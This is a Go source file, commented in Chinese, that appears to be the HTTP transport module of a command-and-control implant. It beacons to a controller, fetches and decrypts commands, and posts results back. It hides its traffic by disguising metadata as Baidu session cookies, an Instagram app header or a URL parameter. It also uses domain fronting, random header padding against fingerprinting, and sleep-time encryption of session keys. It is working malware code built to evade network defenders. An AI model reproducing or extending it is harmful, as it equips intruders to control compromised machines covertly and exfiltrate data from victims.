//go:build transport_http

package main

import (
	"implant/core/app"
	"implant/core/communication"
	"implant/core/config"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"time"
)



// httpGetMetadataPrepend 必须与服务端 config.Http_get_metadata_prepend 完全一致
// （服务端用 strings.TrimPrefix 去掉它以取 MetaInfo）。A3 后服务端改用占位符，此处同步。
const httpGetMetadataPrepend = "BDUSS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE; BDUSS_BFESS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE;SESSIONID="

// listenerType 监听器类型（服务端 patch 与 FirstBlood 用）
const listenerType = "http"

// NewTransport 构造 http 传输（单二进制 build tag 入口）
func NewTransport() transportClient {
	return &HTTPClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (s *HTTPClient) IsConnected() bool { return s.connected }

// ReconnectMgr 返回重连管理器
func (s *HTTPClient) ReconnectMgr() *reconnect.ReconnectManager { return s.reconnectMgr }

type HTTPClient struct {
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	getURL       string
	postURL      string
	client       *http.Client
}

// httpClient 全局 HTTP 客户端：带超时（30s），防止连接挂起时 Recv 永久阻塞、beacon 失联
func newHTTPClient() *http.Client {
	return &http.Client{
		Timeout: 30 * time.Second,
	}
}

func (s *HTTPClient) fail() {
	s.connected = false
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectFailed()
	}
}

func (s *HTTPClient) setURLs(host string) {
	s.getURL = "http://" + host + config.HTTPGetURI()
	s.postURL = "http://" + host + config.HTTPPostURI()
	if s.client == nil {
		s.client = newHTTPClient()
	}
}

// Connect: FirstBlood（GET 直到 200）+ 设置会话密钥。
func (s *HTTPClient) Connect(host string) error {
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectAttempt()
	}
	s.setURLs(host)
	if len(utils.MetaInfo) == 0 {
		metaRaw, metaErr := utils.EncryptedMetaInfo()
		if metaErr != nil {
			s.fail()
			return fmt.Errorf("生成 MetaInfo 失败: %v", metaErr)
		}
		metaB64, metaErr2 := encrypt.EncodeBase64(metaRaw)
		if metaErr2 != nil {
			s.fail()
			return fmt.Errorf("编码 MetaInfo 失败: %v", metaErr2)
		}
		utils.MetaInfo = metaB64
	}

	// FirstBlood: GET 直到 HTTP 200
	for attempt := 0; ; attempt++ {
		if err := s.getRaw(); err == nil {
			break
		}
		if attempt >= 5 {
			s.fail()
			return fmt.Errorf("FirstBlood 失败")
		}
		time.Sleep(time.Duration(1<<uint(attempt)) * time.Second)
	}

	// 会话密钥
	salt, masterKey := app.GetListenerKeyConfig("http")
	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
		s.fail()
		return err
	}
	s.connected = true
	if s.reconnectMgr != nil {
		s.reconnectMgr.OnReconnectSuccess()
	}
	return nil
}

// httpFrontHost 域前置/CDN 回源 Host（占位符由 GenServer patch；未配置时为空不覆盖 Host 头）
var httpFrontHost = strings.TrimSpace("HOST_FRONT_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

// applyFrontHost 若配置了前置域名则覆盖请求 Host 头（CDN 回源场景）
func applyFrontHost(req *http.Request) {
	if httpFrontHost != "" && !strings.HasPrefix(httpFrontHost, "HOST_FRONT_") {
		req.Host = httpFrontHost
	}
}

// applyMetadata 将 metadata（MetaInfo）放入随机/配置的传输通道：
//   cookie（默认）/ header（X-IG-App-ID 伪装头）/ url（?sessionid= 参数）/ auto（每请求随机）。
// 服务端从三通道统一提取后裁 prepend 还原。
func (s *HTTPClient) applyMetadata(req *http.Request) {
	channel := config.MetadataChannel()
	if channel == "auto" {
		channel = []string{"cookie", "header", "url"}[rand.Intn(3)]
	}
	meta := httpGetMetadataPrepend + string(utils.MetaInfo)
	switch channel {
	case "header":
		req.Header.Set("X-IG-App-ID", meta)
	case "url":
		q := req.URL.Query()
		q.Set("sessionid", meta)
		req.URL.RawQuery = q.Encode()
	default: // cookie
		req.Header.Set("Cookie", meta)
	}
}

// applyRequestPadding 流量填充：随机附加请求头，破除请求头长度指纹（GET/POST 通用）。
func (s *HTTPClient) applyRequestPadding(req *http.Request) {
	if !config.PaddingEnabled() {
		return
	}
	padLen := 32 + rand.Intn(96)
	pad := make([]byte, padLen)
	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~"
	for i := range pad {
		pad[i] = alphabet[rand.Intn(len(alphabet))]
	}
	req.Header.Set("X-Client-Data", string(pad))
}

// getRaw 发起一次 GET，仅用于 FirstBlood 探测（检查 200）。
func (s *HTTPClient) getRaw() error {
	req, err := http.NewRequest("GET", s.getURL, nil)
	req.Header.Set("User-Agent", config.UserAgent())
if err != nil {
		return err
	}
	applyFrontHost(req)
	s.applyMetadata(req)
	s.applyRequestPadding(req)
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	return nil
}

// Recv: GET 拉取命令，解析 JSON pos_2，解密返回。无命令返回 nil。
func (s *HTTPClient) Recv() ([]byte, error) {
	req, err := http.NewRequest("GET", s.getURL, nil)
	req.Header.Set("User-Agent", config.UserAgent())
if err != nil {
		return nil, err
	}
	applyFrontHost(req)
	s.applyMetadata(req)
	s.applyRequestPadding(req)
	resp, err := s.client.Do(req)
	if err != nil {
		s.fail()
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		s.fail()
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// 服务端 action_rule.pos_2 为 []byte（base64(encryptedCmd)），JSON marshal 再套一层 base64。
	// 反序列化到 []byte 会自动解开外层 base64，得到 base64(encryptedCmd)。
	var respJSON struct {
		Data struct {
			ActionRule struct {
				Pos2 []byte `json:"pos_2"`
			} `json:"action_rule"`
		} `json:"data"`
	}
	if err := json.Unmarshal(body, &respJSON); err != nil {
		return nil, err
	}
	pos2 := respJSON.Data.ActionRule.Pos2
	if len(pos2) == 0 {
		return nil, nil // 无命令
	}
	rawData, err := encrypt.DecodeBase64(pos2) // 解开内层 base64 -> encryptedCmd
	if err != nil {
		return nil, err
	}
	decrypted, err := communication.DecryptCommand(rawData)
	if err != nil {
		return nil, err
	}
	// 【会话密钥唯一化】消费服务端下发的 nonce 协商消息（type=4）
	return communication.ConsumeSessionNonce(decrypted)
}

// SendResult: POST body=b64Packet + Cookie。HTTP 协议不加 MetaInfo 分帧（服务端直接读 body）。
func (s *HTTPClient) SendResult(b64Packet []byte) error {
	req, err := http.NewRequest("POST", s.postURL, strings.NewReader(string(b64Packet)))
	req.Header.Set("User-Agent", config.UserAgent())
if err != nil {
		return err
	}
	applyFrontHost(req)
	s.applyMetadata(req)
	s.applyRequestPadding(req)
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return nil
}

func (s *HTTPClient) Close() error { return nil }

// PollInterval 轮询型传输：空闲轮询间隔 = sleep 基准（SLEEP 命令动态生效）。
// runloop 对实现了该接口的传输走 app.SleepMask（睡眠期用随机 pad 加密会话密钥）。
// 【修复】此前 HTTP 未实现它，被当成持久传输走 SleepWithJitter —— 主信道的会话密钥
// 在空闲期完全明文驻留内存，而 DNS/OSS 反而有保护。
func (c *HTTPClient) PollInterval() time.Duration { return config.WaitTime }
